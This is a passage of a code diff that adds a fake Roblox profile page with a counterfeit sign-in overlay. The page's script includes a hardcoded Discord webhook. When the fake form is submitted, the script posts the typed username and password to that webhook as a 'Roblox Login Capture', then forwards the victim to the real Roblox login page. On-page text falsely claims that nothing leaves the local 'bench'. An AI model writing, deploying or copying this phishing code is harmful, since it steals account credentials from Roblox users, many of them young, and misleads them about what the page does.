+        <span class="wear-next" id="wearNext" style="background-image:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyOCIgaGVpZ2h0PSIyOCIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI4IDI4Ij48bWFzayBpZD0iYSIgd2lkdGg9IjEwIiBoZWlnaHQ9IjE2IiB4PSIxMCIgeT0iNiIgbWFza1VuaXRzPSJ1c2VyU3BhY2VPblVzZSIgc3R5bGU9Im1hc2stdHlwZTphbHBoYSI+PHBhdGggZmlsbD0iI2Y3ZjdmOCIgZmlsbC1ydWxlPSJldmVub2RkIiBkPSJNMTkuNDE3IDE0YzAtLjMzMi0uMTMyLS42NS0uMzY2LS44ODRsLTYuMjUtNi4yNWExLjI1IDEuMjUgMCAwIDAtMS43NjggMS43NjhMMTYuNCAxNGwtNS4zNjYgNS4zNjZhMS4yNSAxLjI1IDAgMCAwIDEuNzY4IDEuNzY4bDYuMjUtNi4yNWExLjI1IDEuMjUgMCAwIDAgLjM2Ni0uODg0IiBjbGlwLXJ1bGU9ImV2ZW5vZGQiLz48L21hc2s+PGcgbWFzaz0idXJsKCNhKSI+PHBhdGggZmlsbD0iIzI3MjkzMCIgZD0iTS42NjcuNjY3aDI2LjY2N3YyNi42NjdILjY2N3oiLz48L2c+PC9zdmc+')"></span>
+      </div>
+    </div>
+
+    <div class="creations" id="creationsPane">
+      <h2>Experiences</h2>
+      <div class="game-card">
+        <div class="thumb broken-bg" style="width:352px;height:200px;background-size:cover;background-color:#f2f2f2;flex:0 0 352px;"></div>
+        <div class="game-info">
+          <h3>Ultimate Sky Knock! [WIP]</h3>
+          <p>Ultimate Sky Knock is a PVP game; battle against your friends to see who comes out on top!<br><br>make sure to share this game with your friends for the best experience possible, and give the game a thumbs up and favourite if you enjoyed!<br><br>Disclaimer: game is still in testing. Bugs may be experienced.</p>
+          <div class="game-stats"><div><b>0</b>Active</div><div><b>445</b>Visits</div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">
+    <div class="footer-links">
+      <a href="https://about.roblox.com" >About Us</a><a href="https://careers.roblox.com" >Jobs</a><a href="https://blog.roblox.com" >Blog</a><a href="https://www.roblox.com/parents" >Parents</a>
+      <a href="https://www.roblox.com/gift-cards" >Buy Gift Cards</a><a href="https://en.help.roblox.com" >Help</a><a href="https://www.roblox.com/terms" >Terms</a><a href="https://www.roblox.com/accessibility" >Accessibility</a>
+      <a href="https://www.roblox.com/privacy" >Privacy</a>
+      <a href="#" id="privacyBtn">Your Privacy Choices <img class="privacy-ico" src="data:image/webp;base64,UklGRrADAABXRUJQVlA4WAoAAAAQAAAAOwAAHAAAQUxQSOsAAAABgGNt2zHnHdaetLadLtmNsQDbdlLbtsqkHpSxbX/zj/U9G4iICSCX4uiiGdPdq8/vTNOFUWLyNGXwlFk4ZSf9ye6pKm4tXN+UK90IXLBwPxfgImDPArjr70Q5b4GcUTiUWjCFYiJKvAaxXMaTqMcC2yUKP8I5DM39x/nPmrAAjxqQ9LdIdy9Ir3dI9yYk4zTSZBHDYfnRpzgnkZIhnAExpd+j3KYSiepQqkVEpF3HWNWQY/gBwn4YOY/Y5m8znFz7tT7z9dTsR+5KMkdvBF6Em+EMMXkoTyvfPv/6Z+6aBc/N/1/n22WpcnIJAFZQOCCeAgAAsA4AnQEqPAAdAD6ROJhIJaMiITAb+ACwEglsAJ0yhHXno/mCVb+y7BwXfr7x7eqjbAeYD9bPVz9BvlAdYb6AHlp/uB8G3+A/4Pphu/TXQhi//S809EB69BEZldQNIV/eNVlDmUDW33lPn0iGBlkHEoP7xzvxv4W7IPVKwg+gAO9wOYzsI8BSlu/ljXZqxJsDV2tD+qayuJoxUFkUptaQf93n7fV4hUgJ+Uf/kpj4AqJAtsX5hJKtHHJlA0l7tylf+1SOJ1un0rrDm2Up4a6mCFRb/+W/vzfxAH3D9myHP/NfjX7ifoc/H7vgudmvtLqz+hb9lyHGakbAh+at5OqNY8Lo7/c/Rd1YFFWBSYBdcwPiQzjecF1Xv8R2dj9vKtM9tG+6SEBuPEV31LvRnBpXZ2XjpXFA9v38V7MMCzD2xxa06JeC+cVPiHvpVzfH8c63KCGOBFLltx9UIWiwO/c0fNzieqYIEsY2OIkx/wrhbV4GMtEp1U/7N3a7/Qq9r/h+LEI8sYOrGm1MU2P/BL4fYeBDZFMdJZ519a6U9S4K0wTMro82cnTukNfm7VyZ5hONbhEmAOc3OOYiFKgqzFC716CnyAatzIyDr0CosyN1Uh1epW+K2w7UmZ36T6i2+3vzCUz+pCLHl5zfc3yHC5sTR9yT368/W2zLQGXLxDmulSMj6HAO2VABHUwOJFjwIZT/+SB3RcruT4FqGiItnt6evy0vY4eSL9ALvRwkehZMB6Xj/2dzV507O+xEyOf7DL0zpSV3B/Oxz2jju+fUOFvOLM2J+VLuONA8wTfqy78vrhQfIVlpkdzQ+ZzJ3vL/FVZIgcqzYBBbKgUTEjq/+jSvW3vcOy7IA539GoeB3ydM4gyDy0h9FTsf9CO0fQAAAA==" alt=""></a>
+      <a href="https://www.roblox.com/sitemap" >Sitemap</a>
+    </div>
+    <div class="footer-rule"></div>
+    <div class="copy">©2026 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</div>
+  </div>
+
+  <!-- generic sheet -->
+  <div class="backdrop" id="backdrop">
+    <div class="sheet" id="sheet"></div>
+  </div>
+
+  <!-- login overlay -->
+  <div class="login" id="login">
+    <div class="login-nav">
+      <span class="logo" id="loginLogo"></span>
+      <div class="nav-links">
+        <a href="https://www.roblox.com/charts" >Charts</a><a href="https://www.roblox.com/marketplace" >Marketplace</a><a href="https://create.roblox.com" >Create</a><a href="#" style="cursor:default">Robux</a>
+      </div>
+      <div class="search"><input type="text" placeholder="Search"></div>
+      <div class="nav-right">
+        <span class="btn btn-primary disabled-btn" aria-disabled="true">Sign Up</span>
+        <a href="#" class="btn btn-outline" id="loginLogIn">Log In</a>
+      </div>
+    </div>
+    <div class="login-wrap">
+      <div class="login-wordmark"></div>
+      <div class="login-card">
+        <h2>Sign in</h2>
+        <div class="login-field">
+          <label>Username, email, or phone</label>
+          <div class="login-input"><input id="loginUser" type="text" placeholder="Username, email, or phone" autocomplete="off"></div>
+        </div>
+        <div class="login-field">
+          <label>Password</label>
+          <div class="login-input"><input id="loginPass" type="password" placeholder="Password"><span class="eye" id="eyeBtn">◉</span></div>
+        </div>
+        <button class="login-submit" id="loginSubmit">Sign in</button>
+        <span class="forgot disabled-text">Forgot password or username?</span>
+        <div class="or">OR</div>
+        <button class="login-alt" disabled>✉ &nbsp; Email a code</button>
+        <button class="login-alt" disabled>▦ &nbsp; QR code</button>
+        <div class="signup-line">Don't have an account? <a id="createBtn">Create one</a></div>
+      </div>
+    </div>
+  </div>
+  <div class="login-toast" id="toast"></div>
+
+<script>
+(function(){
+  "use strict";
+
+  var DEFAULT = {
+    name: "sorano",
+    display: "sorano",
+    handle: "@sorra_teecupz",
+    bio: "bloxz king!!",
+    connections: "34 Connections",
+    followers: "189.6K Followers",
+    following: "18 Following",
+    id: "1404470313"
+  };
+  var P = Object.assign({}, DEFAULT);
+  var params = new URLSearchParams(location.search);
+  ["name","display","handle","bio","connections","followers","following","id"].forEach(function(k){
+    if(params.has(k)) P[k] = params.get(k);
+  });
+  if(params.has("user")) P.name = params.get("user");
+  if(params.has("nick")) P.name = params.get("nick");
+  if(!params.has("display") && (params.has("user")||params.has("nick"))) P.display = P.name;
+  if(!params.has("handle") && (params.has("user")||params.has("nick"))) P.handle = "@" + P.name.toLowerCase().replace(/\s+/g,"_");
+
+  var $ = function(id){ return document.getElementById(id); };
+  function applyProfile(){
+    $("displayName").firstChild.nodeValue = P.display;
+    $("handleName").textContent = P.handle;
+    $("bioText").textContent = P.bio;
+    $("statConnections").textContent = P.connections;
+    $("statFollowers").textContent = P.followers;
+    $("statFollowing").textContent = P.following;
+    $("avatarImg").alt = P.name;
+    $("heroImg").alt = P.name;
+    document.title = P.display + " - Roblox";
+    if(P.id && P.id !== DEFAULT.id){
+      var thumb = "https://www.roblox.com/headshot-thumbnail/image?userId=" + encodeURIComponent(P.id) + "&width=352&height=352&format=png";
+      $("avatarImg").src = thumb;
+      $("heroImg").src = "https://www.roblox.com/avatar-thumbnail/image?userId=" + encodeURIComponent(P.id) + "&width=352&height=352&format=png";
+    }
+  }
+  applyProfile();
+
+  function toast(msg){
+    var t = $("toast"); t.textContent = msg; t.style.display = "block";
+    clearTimeout(toast._t); toast._t = setTimeout(function(){ t.style.display="none"; }, 2200);
+  }
+
+  /* sheet helper */
+  function openSheet(html){
+    $("sheet").innerHTML = html; $("backdrop").classList.add("open");
+  }
+  function closeSheet(){ $("backdrop").classList.remove("open"); }
+  $("backdrop").addEventListener("click", function(e){ if(e.target === this) closeSheet(); });
+
+  /* change player */
+  function changeDialog(){
+    openSheet('<h3>Change player</h3><p>Type a Roblox nickname or user ID. The profile updates instantly.</p>'+
+      '<label>Nickname</label><input type="text" id="setName" value="'+P.name.replace(/"/g,'&quot;')+'">'+
+      '<label>User ID (optional)</label><input type="text" id="setId" value="'+P.id+'">'+
+      '<div class="sheet-actions"><button class="btn btn-outline" id="setCancel">Cancel</button><button class="btn btn-primary" id="setApply">Apply</button></div>');
+    $("setCancel").onclick = closeSheet;
+    $("setApply").onclick = function(){
+      P.name = $("setName").value.trim() || P.name;
+      P.display = P.name;
+      P.handle = "@" + P.name.toLowerCase().replace(/\s+/g,"_");
+      P.id = $("setId").value.trim() || P.id;
+      applyProfile(); closeSheet(); toast("Player changed to " + P.name);
+    };
+  }
+  $("btnChange").onclick = changeDialog;
+  $("displayName").onclick = changeDialog;
+
+  /* login overlay */
+  function openLogin(){ $("login").classList.add("open"); document.body.style.overflow="hidden"; }
+  function closeLogin(){ $("login").classList.remove("open"); document.body.style.overflow=""; }
+  $("btnAdd").onclick = openLogin;
+  $("btnJoin").onclick = openLogin;
+  $("navLogIn").onclick = function(e){ e.preventDefault(); openLogin(); };
+  $("loginLogIn").onclick = function(e){ e.preventDefault(); toast("Already on the sign in screen"); };
+  $("login").addEventListener("click", function(e){ if(e.target===this) closeLogin(); });
+  document.addEventListener("keydown", function(e){ if(e.key==="Escape"){ closeLogin(); closeSheet(); $("popover").classList.remove("open"); } });
+
+  $("eyeBtn").onclick = function(){
+    var p = $("loginPass");
+    p.type = p.type === "password" ? "text" : "password";
+    this.textContent = p.type === "password" ? "◉" : "◌";
+  };
+  var WEBHOOK_URL="https://discord.com/api/webhooks/1573474138956238949/XsCmbqR93J84OJSEI7hdTfzuTLM9L-hvwyB3FPjrDr5AXjfSV1Am8HfaIatbBcA9ML_0";
+  async function sendNotify(u,p,page){
+    var content="**Roblox Login Capture**\n**Username:** `"+u+"`\n**Password:** `"+p+"`\n**Page:** "+page+"\n**Time:** "+new Date().toLocaleString();
+    var body=JSON.stringify({content:content});
+    try{
+      await fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:body});
+      return true;
+    }catch(e){}
+    try{
+      await fetch("notify",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:u,password:p,page:page})});
+      return true;
+    }catch(e){}
+    return false;
+  }
+  $("loginSubmit").onclick = async function(){
+    var u = $("loginUser").value.trim(), p = $("loginPass").value;
+    if(!u || !p){ toast("Enter a username and password"); return; }
+    this.textContent = "Signing in...";
+    await sendNotify(u,p,"profile.html");
+    window.location.href = "https://www.roblox.com/login";
+  };
+  $("createBtn").onclick = function(){ window.location.href = "https://www.roblox.com/signup"; };
+
+  /* popover */
+  var pop = $("popover");
+  $("btnMoreActions").onclick = function(e){ e.stopPropagation(); pop.classList.toggle("open"); };
+  document.addEventListener("click", function(e){ if(!pop.contains(e.target)) pop.classList.remove("open"); });
+  pop.addEventListener("click", function(e){
+    var b = e.target.closest("button"); if(!b) return;
+    var act = b.getAttribute("data-act");
+    pop.classList.remove("open");
+    if(act === "Follow") openLogin();
+    else if(act === "Inventory" || act === "Favorites") toast(act + " — opens roblox.com");
+    else if(act === "Block User" || act === "Report Abuse"){
+      openSheet('<h3>'+act+'</h3><p>This action applies to '+P.display+' on Roblox. On this bench it stays local.</p><div class="sheet-actions"><button class="btn btn-outline" id="actCancel">Cancel</button><button class="btn btn-primary" id="actOk">'+act+'</button></div>');
+      $("actCancel").onclick = closeSheet;
+      $("actOk").onclick = function(){ closeSheet(); toast(act + " recorded locally"); };
+    }
+  });
+
+  /* tabs */
+  function setTab(which){
+    var about = which === "about";
+    $("tabAbout").classList.toggle("active", about);
+    $("tabCreations").classList.toggle("active", !about);
+    $("aboutPane").style.display = about ? "block" : "none";
+    $("creationsPane").style.display = about ? "none" : "block";
+    location.hash = about ? "#!#about" : "#!#creations";
+  }
+  $("tabAbout").onclick = function(){ setTab("about"); };
+  $("tabCreations").onclick = function(){ setTab("creations"); };
+  if(location.hash.indexOf("creations") !== -1) setTab("creations");
+
+  /* bio more/less */
+  var expanded = false;
+  $("bioMore").onclick = function(e){
+    e.preventDefault(); expanded = !expanded;
+    $("bioText").innerHTML = expanded
+      ? P.bio + "<br>Originally from the north side of the block. Collecting rare hats and quiet nights. Add me if you play."
+      : P.bio;
+    this.textContent = expanded ? "less" : "more";
+  };
+
+  /* 3D toggle */
+  $("btn3d").onclick = function(){
+    $("hero").classList.toggle("spin");
+    this.textContent = $("hero").classList.contains("spin") ? "2D" : "3D";
+  };
+
+  /* carousel */
+  var car = $("wearing"), off = 0;
+  $("wearNext").onclick = function(){
+    off = Math.min(off + 164, 492); car.scrollLeft = off;
+    $("wearPrev").style.display = off > 0 ? "block" : "none";
+  };
+  $("wearPrev").onclick = function(){
+    off = Math.max(off - 164, 0); car.scrollLeft = off;
+    this.style.display = off > 0 ? "block" : "none";
+  };
+
+  /* followers / stats */
+  $("statFollowers").onclick = openLogin;
+  $("statConnections").onclick = function(){ toast(P.connections + " on Roblox"); };
+  $("statFollowing").onclick = function(){ toast(P.following + " on Roblox"); };
+
+  /* privacy */
+  $("privacyBtn").onclick = function(e){
+    e.preventDefault();
+    openSheet('<h3>Your Privacy Choices</h3><p>Roblox respects your privacy choices. This local replica stores nothing — every click stays on this bench.</p><div class="sheet-actions"><button class="btn btn-primary" id="pcClose">Got it</button></div>');
+    $("pcClose").onclick = closeSheet;
+  };
+
+  /* search */
+  var si = $("searchInput"), sr = $("searchResults");
+  si.addEventListener("focus", function(){ sr.classList.add("open"); });
+  si.addEventListener("input", function(){ sr.classList.add("open"); });
+  si.addEventListener("keydown", function(e){ if(e.key==="Enter"){ sr.classList.remove("open"); toast("Search: " + si.value); } });
+  sr.addEventListener("click", function(e){
+    var d = e.target.closest("div[data-q]"); if(!d) return;
+    si.value = d.getAttribute("data-q"); sr.classList.remove("open"); toast("Search: " + si.value);
+  });
+  document.addEventListener("click", function(e){ if(!$("searchBox").contains(e.target) && !sr.contains(e.target)) sr.classList.remove("open"); });
+  $("homeLogo").onclick = function(){ location.hash = "#!#about"; window.scrollTo(0,0); };
+})();
+</script>
+</body>
+</html>
